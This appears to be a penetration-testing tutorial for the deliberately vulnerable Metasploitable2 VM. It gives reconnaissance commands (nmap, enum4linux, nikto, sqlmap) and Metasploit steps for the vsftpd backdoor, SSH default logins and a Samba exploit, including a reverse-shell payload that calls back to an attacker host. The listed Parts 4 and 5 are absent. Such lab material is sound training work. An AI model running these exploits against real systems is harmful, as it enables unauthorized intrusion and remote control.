# Metasploitable2


# Metasploitable2 Vulnerability Assessment: From Basic to Advanced

## Overview

Metasploitable2 is an intentionally vulnerable Linux virtual machine designed for security training and penetration testing practice. This comprehensive guide covers vulnerability assessment techniques from basic reconnaissance to advanced kernel exploitation, providing both manual and automated approaches for security professionals and ethical hackers.

## Table of Contents

- [Part 1: Introduction & Setup](#part-1-introduction--setup)
- [Part 2: Manual Recon & Automated Recon](#part-2-manual-recon--automated-recon)
- [Part 3: Basic Exploits & Payload Usage](#part-3-basic-exploits--payload-usage)
- [Part 4: Advanced Exploits & Custom Exploit Development](#part-4-advanced-exploits--custom-exploit-development)
- [Part 5: Kernel Exploitation in Python & C++](#part-5-kernel-exploitation-in-python--c)

---

## Part 1: Introduction & Setup

### What is Metasploitable2?

Metasploitable2 is a deliberately vulnerable Ubuntu Linux distribution containing numerous security flaws across multiple services and applications. Released by Rapid7, it serves as an ideal testing ground for penetration testers to practice their skills in a controlled environment without legal concerns.

### Key Vulnerabilities Include:
- Unpatched services (SSH, FTP, HTTP, SMB)
- Weak authentication mechanisms
- Misconfigured applications
- Buffer overflow vulnerabilities
- SQL injection flaws
- Cross-site scripting (XSS) vulnerabilities

### Setup Requirements

\`\`\`bash
# Download Metasploitable2 VM
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip

# Default credentials
Username: msfadmin
Password: msfadmin

# Network configuration
# Ensure VM is on isolated network for safety
\`\`\`

---

## Part 2: Manual Recon & Automated Recon

### Manual Reconnaissance

Manual reconnaissance forms the foundation of any successful penetration test. It involves systematic information gathering using basic tools and techniques.

#### Network Discovery
\`\`\`bash
# Ping sweep to identify live hosts
nmap -sn 192.168.1.0/24

# Basic port scan
nmap -sS -O 192.168.1.100

# Service version detection
nmap -sV -p- 192.168.1.100
\`\`\`

#### Service Enumeration
\`\`\`bash
# SSH enumeration
ssh -v 192.168.1.100

# HTTP enumeration
curl -I http://192.168.1.100
dirb http://192.168.1.100

# SMB enumeration
enum4linux 192.168.1.100
smbclient -L //192.168.1.100
\`\`\`

### Automated Reconnaissance

Automated tools accelerate the reconnaissance phase and ensure comprehensive coverage.

#### Comprehensive Scanning
\`\`\`bash
# Nmap comprehensive scan
nmap -A -T4 -oA metasploitable_scan 192.168.1.100

# Vulnerability scanning with Nessus
# Configure Nessus policy for comprehensive scan

# OpenVAS automated vulnerability assessment
openvas-cli -T csv -o metasploitable_report.csv
\`\`\`

#### Automated Web Application Testing
\`\`\`bash
# Nikto web vulnerability scanner
nikto -h http://192.168.1.100

# OWASP ZAP automated scan
zap-cli quick-scan http://192.168.1.100

# SQLmap for SQL injection testing
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
\`\`\`

---

## Part 3: Basic Exploits & Payload Usage

### Understanding Metasploit Framework

The Metasploit Framework provides a comprehensive platform for exploit development and payload delivery.

#### Basic Exploitation Workflow
\`\`\`bash
# Start Metasploit console
msfconsole

# Search for exploits
search type:exploit platform:linux

# Use specific exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
exploit

# Payload selection
set payload cmd/unix/reverse
set LHOST 192.168.1.50
set LPORT 4444
\`\`\`

### Common Metasploitable2 Exploits

#### FTP Backdoor Exploitation
\`\`\`bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
exploit
\`\`\`

#### SSH Weak Credentials
\`\`\`bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME msfadmin
set PASSWORD msfadmin
run
\`\`\`

#### Samba Username Map Script
\`\`\`bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.100
set payload cmd/unix/reverse
exploit
\`\`\`

---
